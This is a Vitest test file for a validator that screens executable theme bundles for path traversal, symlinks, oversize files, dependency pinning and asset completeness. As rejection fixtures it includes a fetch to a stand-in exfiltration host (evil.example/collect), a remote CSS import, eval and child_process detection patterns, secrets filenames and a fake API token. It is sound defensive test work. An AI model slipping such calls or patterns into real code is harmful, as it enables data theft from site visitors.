import { describe, expect, it } from "vitest";
import {
  DEV_THEME_BUNDLE_LIMITS,
  fingerprintDevThemeRelease,
  hashBytes,
  validateDevThemeBundle,
  type DevThemeBundleFile,
} from "./dev-theme-bundle";
import { DEV_THEME_RUNTIME_VERSION } from "./dev-theme-manifest";
// Reverse-direction lane check: the frozen data-only gate must refuse
// Level B manifests (read-only import — theme-package.ts is NOT modified).
import { validateThemeManifest } from "./theme-package";

/**
 * Level B executable-bundle validator — TDD vectors.
 *
 * The bundle lane is a DISTINCT artifact type from data-only theme packages:
 * `dev.theme.json` at the root (never `theme.json`), js/css/map/font/image
 * files only, no server code. The two validators refuse each other's inputs
 * in both directions (one direction here, the other via the frozen gate).
 */

function devManifest(
  over: Record<string, unknown> = {},
): Record<string, unknown> {
  return {
    id: "aurora-lookbook",
    version: "1.0.0",
    runtime: DEV_THEME_RUNTIME_VERSION,
    name: "Aurora Lookbook",
    publisher: "Studio Framique",
    capabilities: ["presentation", "animation"],
    dependencies: [
      {
        name: "gsap",
        version: "3.15.0",
        license: "MIT",
        integrity: "sha384-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
      },
    ],
    sections: [{ key: "hero", slot: "main", component: "HeroCanvas" }],
    settings: [{ key: "headline", label: "Headline", type: "text" }],
    ...over,
  };
}

function dataOnlyManifest(): Record<string, unknown> {
  return {
    key: "aurora-lookbook",
    name: "Aurora",
    nameBn: "Aurora",
    version: "1.0.0",
    api: "^3.0.0",
    templates: ["index"],
    presentationSurfaces: ["header"],
    locales: ["en"],
    capabilities: ["render_storefront"],
  };
}

const GSAP_DEP = {
  name: "gsap",
  version: "3.15.0",
  license: "MIT",
  integrity: "sha384-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
};

function file(
  path: string,
  text: string,
  extra: Partial<DevThemeBundleFile> = {},
): DevThemeBundleFile {
  return { path, bytes: new TextEncoder().encode(text), ...extra };
}

function validFiles(manifestText?: string): DevThemeBundleFile[] {
  return [
    file("dev.theme.json", manifestText ?? JSON.stringify(devManifest())),
    file(
      "components/Hero.js",
      `export function HeroCanvas() { return "hero"; }`,
    ),
    file("styles/main.css", `.hero { color: red; }`),
    file("assets/logo.png", "fake-png-bytes"),
    file("locales/en.json", JSON.stringify({ headline: "Hello" })),
  ];
}

function validInput(over: Record<string, unknown> = {}) {
  return {
    manifest: devManifest(),
    files: validFiles(),
    dependencies: [{ ...GSAP_DEP }],
    ...over,
  };
}

describe("validateDevThemeBundle — valid bundles", () => {
  it("accepts a valid executable bundle", () => {
    const verdict = validateDevThemeBundle(validInput());
    expect(verdict.ok).toBe(true);
  });

  it("hashes every file and mints a stable hex fingerprint", () => {
    const a = validateDevThemeBundle(validInput());
    const b = validateDevThemeBundle(validInput());
    expect(a.ok && b.ok).toBe(true);
    if (!a.ok || !b.ok) return;
    expect(a.fingerprint).toMatch(/^[0-9a-f]{64}$/);
    expect(a.fingerprint).toBe(b.fingerprint);
    expect(a.files.length).toBe(5);
    for (const f of a.files) expect(f.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it("is order-independent: shuffled files share one fingerprint", () => {
    const input = validInput();
    const shuffled = validateDevThemeBundle({
      ...input,
      files: [...input.files].reverse(),
    });
    const straight = validateDevThemeBundle(input);
    expect(shuffled.ok && straight.ok).toBe(true);
    if (!shuffled.ok || !straight.ok) return;
    expect(shuffled.fingerprint).toBe(straight.fingerprint);
  });

  it("fingerprintDevThemeRelease is pure and deterministic", () => {
    const v = validateDevThemeBundle(validInput());
    expect(v.ok).toBe(true);
    if (!v.ok) return;
    expect(fingerprintDevThemeRelease(v.manifest, v.files)).toBe(v.fingerprint);
    expect(fingerprintDevThemeRelease(v.manifest, [...v.files].reverse())).toBe(
      v.fingerprint,
    );
  });

  it("allows js/mjs/cjs/css/map/font/image extensions", () => {
    const files = validFiles();
    files.push(
      file("components/extra.mjs", `export const x = 1;`),
      file("components/legacy.cjs", `module.exports = {};`),
      file("components/Hero.js.map", JSON.stringify({ version: 3 })),
      file("assets/face.woff2", "fake-font-bytes"),
    );
    expect(validateDevThemeBundle(validInput({ files })).ok).toBe(true);
  });
});

describe("validateDevThemeBundle — lane separation (both directions)", () => {
  it("rejects a data-only manifest HERE with a wrong-lane code", () => {
    const verdict = validateDevThemeBundle({
      manifest: dataOnlyManifest(),
      files: [file("theme.json", JSON.stringify(dataOnlyManifest()))],
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/wrong_lane/);
  });

  it("rejects a bundle carrying a root theme.json (data-only marker)", () => {
    const files = validFiles();
    files.push(file("theme.json", JSON.stringify(dataOnlyManifest())));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/wrong_lane/);
  });

  it("the frozen data-only gate refuses a Level B manifest (reverse direction)", () => {
    // No modification to theme-package.ts: its required data-only fields
    // (key/api/templates/…) already fail a dev-theme shape. This pins the
    // refusal so the lanes can never silently accept each other's input.
    const verdict = validateThemeManifest(devManifest());
    expect(verdict.ok).toBe(false);
  });
});

describe("validateDevThemeBundle — executable allowlist", () => {
  it.each(["server.ts", "run.php", "install.exe", "deploy.sh", "evil.py"])(
    "rejects executable extension %s",
    (name) => {
      const files = validFiles();
      files.push(file(`components/${name}`, "payload"));
      const verdict = validateDevThemeBundle(validInput({ files }));
      expect(verdict.ok).toBe(false);
      if (verdict.ok) return;
      expect(verdict.errors.join(" ")).toMatch(/blocked_extension/);
    },
  );

  it("rejects server areas (server/api/functions/handlers/node_modules)", () => {
    const files = validFiles();
    files.push(file("server/index.js", `export const x = 1;`));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/disallowed_location/);
  });

  it("rejects files outside known areas", () => {
    const files = validFiles();
    files.push(file("api/routes.js", `export const x = 1;`));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
  });

  it("rejects a missing root dev.theme.json", () => {
    const verdict = validateDevThemeBundle({
      manifest: devManifest(),
      files: [file("components/Hero.js", `export const x = 1;`)],
      dependencies: [{ ...GSAP_DEP }],
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/missing_manifest/);
  });
});

describe("validateDevThemeBundle — server code / secrets / network", () => {
  it.each([
    [`require("child_process")`, "child_process"],
    [`http.createServer()`, "server"],
    [`app.listen(3000)`, "server"],
    [`const k = process.env.SECRET`, "server"],
    [`eval(userInput)`, "server"],
    [`new Function(code)`, "server"],
  ])("rejects server/dynamic-code pattern: %s", (snippet) => {
    const files = validFiles();
    files.push(file("components/evil.js", `export const x = 1; ${snippet}`));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/server_code/);
  });

  it.each([".env", ".env.production", "id_rsa.pem", "key.key", "secrets.json"])(
    "rejects secrets file %s",
    (name) => {
      const files = validFiles();
      files.push(file(`components/${name}`, "x"));
      const verdict = validateDevThemeBundle(validInput({ files }));
      expect(verdict.ok).toBe(false);
      if (verdict.ok) return;
      expect(verdict.errors.join(" ")).toMatch(/secrets_file/);
    },
  );

  it("rejects embedded credentials (Tier-0 parity with the data-only lane)", () => {
    const files = validFiles();
    // Split literal (repo pattern: package-scan.test.ts) so the repo's own
    // secret scanner never sees a joined token in this fixture.
    const token = "sk-" + "abcdefghijklmnopqrstuvwxyz0123456789";
    files.push(file("components/evil.js", `export const key = "${token}";`));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/secret/);
  });

  it("rejects non-allowlisted network hosts in JS", () => {
    const files = validFiles();
    files.push(
      file(
        "components/evil.js",
        `fetch("https://evil.example/collect"); export const x = 1;`,
      ),
    );
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/network_host/);
  });

  it("allows relative URLs and explicitly allowlisted hosts", () => {
    const files = validFiles();
    files.push(
      file(
        "components/ok.js",
        `fetch("/api/cart"); fetch("https://cdn.framique.test/a.js"); export const x = 1;`,
      ),
    );
    const verdict = validateDevThemeBundle(
      validInput({ files, allowedNetworkHosts: ["cdn.framique.test"] }),
    );
    expect(verdict.ok).toBe(true);
  });

  it("rejects remote CSS imports outside the allowlist", () => {
    const files = validFiles();
    files.push(
      file("styles/evil.css", `@import url("https://evil.example/x.css");`),
    );
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/network_host/);
  });
});

describe("validateDevThemeBundle — dependency pins", () => {
  it("rejects a bundle dependency missing from the manifest pins", () => {
    const verdict = validateDevThemeBundle(
      validInput({
        dependencies: [
          { ...GSAP_DEP },
          {
            name: "evil",
            version: "1.0.0",
            license: "MIT",
            integrity: "sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
          },
        ],
      }),
    );
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/dependency_extra/);
  });

  it("rejects a manifest pin missing from the bundle entries", () => {
    const verdict = validateDevThemeBundle(validInput({ dependencies: [] }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/dependency_missing/);
  });

  it("rejects a version drift between bundle entry and manifest pin", () => {
    const verdict = validateDevThemeBundle(
      validInput({ dependencies: [{ ...GSAP_DEP, version: "3.16.0" }] }),
    );
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/dependency_mismatch/);
  });

  it("rejects a malformed integrity on the bundle entry", () => {
    const verdict = validateDevThemeBundle(
      validInput({
        dependencies: [{ ...GSAP_DEP, integrity: "md5-dGVzdA==" }],
      }),
    );
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/dependency_integrity/);
  });

  it("accepts empty pins with empty entries", () => {
    const m = devManifest({ dependencies: [] });
    const verdict = validateDevThemeBundle({
      manifest: m,
      files: validFiles(JSON.stringify(m)),
      dependencies: [],
    });
    expect(verdict.ok).toBe(true);
  });
});

describe("validateDevThemeBundle — traversal / symlink / oversize", () => {
  it.each(["../evil.js", "/abs.js", "components/../../x.js", "__MACOSX/x"])(
    "rejects unsafe path %s",
    (path) => {
      const files = validFiles();
      files.push(file(path, "x"));
      const verdict = validateDevThemeBundle(validInput({ files }));
      expect(verdict.ok).toBe(false);
      if (verdict.ok) return;
      expect(verdict.errors.join(" ")).toMatch(/unsafe_path/);
    },
  );

  it("rejects symlink entries", () => {
    const files = validFiles();
    files.push(file("components/link.js", "x", { symlink: true }));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/symlink/);
  });

  it("rejects duplicate paths", () => {
    const files = validFiles();
    files.push(file("components/Hero.js", "other"));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/duplicate/);
  });

  it("rejects an oversize entry (mirrors package-zip per-file cap)", () => {
    const files = validFiles();
    files.push({
      path: "assets/big.png",
      bytes: new Uint8Array(DEV_THEME_BUNDLE_LIMITS.maxEntryBytes + 1),
    });
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/entry_too_large/);
  });

  it("rejects an over-count bundle (mirrors package-zip file cap)", () => {
    const files = validFiles();
    for (let i = 0; i < DEV_THEME_BUNDLE_LIMITS.maxFiles; i++) {
      files.push(file(`components/g${i}.js`, `export const v${i} = ${i};`));
    }
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/too_many_files/);
  });

  it("any single-byte change mints a new fingerprint", () => {
    const a = validateDevThemeBundle(validInput());
    const files = validFiles().map((f) =>
      f.path === "components/Hero.js"
        ? file(f.path, `export function HeroCanvas() { return "hero!"; }`)
        : f,
    );
    const b = validateDevThemeBundle(validInput({ files }));
    expect(a.ok && b.ok).toBe(true);
    if (!a.ok || !b.ok) return;
    expect(b.fingerprint).not.toBe(a.fingerprint);
  });
});

describe("validateDevThemeBundle — executable l10n (locales are data, never code)", () => {
  it("accepts en + bn locale JSON side by side", () => {
    const files = validFiles();
    files.push(file("locales/bn.json", JSON.stringify({ headline: "হ্যালো" })));
    expect(validateDevThemeBundle(validInput({ files })).ok).toBe(true);
  });

  it("refuses code under locales/ (locale data never executes)", () => {
    const files = validFiles();
    files.push(file("locales/en.js", `export const headline = "Hello";`));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/disallowed_location/);
  });

  it("refuses non-JSON files under locales/", () => {
    const files = validFiles();
    files.push(file("locales/notes.md", "# notes"));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(
      /disallowed_location|blocked_extension/,
    );
  });

  it("refuses embedded credentials in locale JSON (Tier-0 parity)", () => {
    const files = validFiles();
    // Split literal so the repo's own secret scanner never sees a joined
    // token in this fixture (same pattern as the Tier-0 vector above).
    const token = "sk-" + "abcdefghijklmnopqrstuvwxyz0123456789";
    files.push(file("locales/bn.json", JSON.stringify({ api_key: token })));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/secret/);
  });

  it("refuses secrets filenames under locales/", () => {
    const files = validFiles();
    files.push(file("locales/.env", "x"));
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/secrets_file/);
  });
});

describe("data-only lane stays frozen — executables still rejected there", () => {
  it("the frozen gate refuses a .js asset path (no code in data-only packages)", () => {
    const verdict = validateThemeManifest({
      key: "aurora-lookbook",
      name: "Aurora",
      nameBn: "Aurora",
      version: "1.0.0",
      api: "^3.0.0",
      templates: ["index"],
      presentationSurfaces: ["header"],
      locales: ["en"],
      capabilities: ["render_storefront"],
      assetManifest: [
        {
          path: "components/Hero.js",
          sha256: "a".repeat(64),
        },
      ],
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/executable/);
  });
});

describe("validateDevThemeBundle — dependency confusion + asset completeness (frame30 item 9)", () => {
  it("refuses an uppercase dependency name (registry-shaped lowercase only)", () => {
    const bad = devManifest({
      dependencies: [{ ...GSAP_DEP, name: "GSAP" }],
    });
    const verdict = validateDevThemeBundle({
      manifest: bad,
      files: validFiles(JSON.stringify(bad)),
      dependencies: [{ ...GSAP_DEP, name: "GSAP" }],
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/dependency_name/);
  });

  it.each(["^3.15.0", "~3.15.0", "*", "latest", ">=3.0.0"])(
    "refuses a ranged dependency version %s (exact pin only)",
    (version) => {
      const bad = devManifest({
        dependencies: [{ ...GSAP_DEP, version }],
      });
      const verdict = validateDevThemeBundle({
        manifest: bad,
        files: validFiles(JSON.stringify(bad)),
        dependencies: [{ ...GSAP_DEP, version }],
      });
      expect(verdict.ok).toBe(false);
      if (verdict.ok) return;
      expect(verdict.errors.join(" ")).toMatch(/dependency_version/);
    },
  );

  it("refuses a path-shaped dependency name", () => {
    const bad = devManifest({
      dependencies: [{ ...GSAP_DEP, name: "../evil" }],
    });
    const verdict = validateDevThemeBundle({
      manifest: bad,
      files: validFiles(JSON.stringify(bad)),
      dependencies: [{ ...GSAP_DEP, name: "../evil" }],
    });
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/dependency_name/);
  });

  it("refuses a dangling relative JS import — referenced asset must be present", () => {
    const files = validFiles();
    files.push(
      file("components/app.js", `import "./missing.js"; export const x = 1;`),
    );
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/asset_missing/);
  });

  it("refuses a dangling relative CSS url (referenced asset must be present)", () => {
    const files = validFiles();
    files.push(
      file("styles/extra.css", `.hero{background:url(../assets/gone.png)}`),
    );
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/asset_missing/);
  });

  it("accepts a satisfied relative import plus bare registry pins", () => {
    const files = validFiles();
    files.push(
      file("assets/icon.png", "fake-png"),
      file(
        "components/app.js",
        `import "gsap"; import "./helper.js"; export const x = 1;`,
      ),
      file("components/helper.js", `export const h = 1;`),
      file("styles/extra.css", `.hero{background:url(../assets/icon.png)}`),
    );
    expect(validateDevThemeBundle(validInput({ files })).ok).toBe(true);
  });

  it("ignores extensionless bundler aliases (build-time, not file authority)", () => {
    const files = validFiles();
    files.push(
      file("components/app.js", `import "./helper"; export const x = 1;`),
    );
    expect(validateDevThemeBundle(validInput({ files })).ok).toBe(true);
  });

  it("accepts a content-addressed import pinned to the present source hash (emit shape)", () => {
    // The emit stage renames area files to `name.<sha8>.ext`, so authored
    // bundles may reference the pinned OUTPUT name. The gate must accept the
    // ref exactly when a present source hashes to the segment in the ref —
    // that ref is guaranteed to exist in the shipped shape, never a 404.
    const files = validFiles();
    const libBytes = new TextEncoder().encode(`export const lib = 1;`);
    const sha8 = hashBytes(libBytes).slice(0, 8);
    files.push(
      file(
        "components/app.js",
        `import "./vendor/lib.${sha8}.js"; export const x = 1;`,
      ),
      { path: "components/vendor/lib.js", bytes: libBytes },
    );
    expect(validateDevThemeBundle(validInput({ files })).ok).toBe(true);
  });

  it("refuses a content-addressed import whose sha8 does not match present bytes", () => {
    // A stale or fabricated hash would resolve to nothing after the emit
    // rename (404 at serve time), so it stays refused.
    const files = validFiles();
    files.push(
      file(
        "components/app.js",
        `import "./vendor/lib.deadbeef.js"; export const x = 1;`,
      ),
      file("components/vendor/lib.js", `export const lib = 1;`),
    );
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/asset_missing/);
  });

  it("refuses an oversized bundle (per-entry + total caps hold)", () => {
    const files = validFiles();
    files.push({
      path: "assets/big.png",
      bytes: new Uint8Array(DEV_THEME_BUNDLE_LIMITS.maxEntryBytes + 1),
    });
    const verdict = validateDevThemeBundle(validInput({ files }));
    expect(verdict.ok).toBe(false);
    if (verdict.ok) return;
    expect(verdict.errors.join(" ")).toMatch(/entry_too_large/);
  });
});
